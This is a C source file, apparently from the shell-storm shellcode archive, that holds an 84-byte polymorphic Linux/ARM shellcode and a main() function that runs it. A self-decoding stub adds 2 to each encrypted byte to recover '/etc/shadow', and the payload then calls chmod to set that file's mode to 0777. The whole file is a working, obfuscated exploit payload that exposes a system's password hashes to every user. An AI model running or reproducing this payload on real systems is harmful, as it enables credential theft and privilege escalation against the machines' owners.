/*
 | Title:    Linux/ARM - polymorphic chmod("/etc/shadow", 0777) - 84 Bytes
 | Type:     Shellcode
 | Author:   Florian Gaultier <florian.gaultier@shell-storm.org>
 | Platform: Linux ARM (ARM926EJ-S rev 5 (v51))
 | [+]       http://www.shell-storm.org
*/


#include <stdio.h>


char shellcode[] =
"\x24\x60\x8f\xe2"     //add r6, pc, #36
"\x16\xff\x2f\xe1"     //bx r6
"\xde\x40\xa0\xe3"     //mov r4, #222
"\x01\x0c\x54\xe3"     //cmp r4, #256
"\x1e\xff\x2f\x81"     //bxhi lr
"\xde\x40\x44\xe2"     //sub r4, r4, #222
"\x04\x50\xde\xe7"     //ldrb r5, [lr, r4]
"\x02\x50\x85\xe2"     //add r5, r5, #2 (add 2 at every shellcode's byte)
"\x04\x50\xce\xe7"     //strb r5, [lr, r4]
"\xdf\x40\x84\xe2"     //add r4, r4, #223
"\xf7\xff\xff\xea"     //b 8078
"\xf5\xff\xff\xeb"     //bl 8074
//shellcode crypted
"\xff\x5e\x8d\xe0"
"\x14\xfd\x2d\xdf"
"\x76\x44"
"\x0a\x2e"
"\xfd\x1f"
"\xfd\x2f"
"\x0d\x25"
"\xff\xdd"
"\xff\x25"
"\xff\xdd"
"-cra-qf_bmu";


int main()
{
        (*(void(*)()) shellcode)();

return 0;
}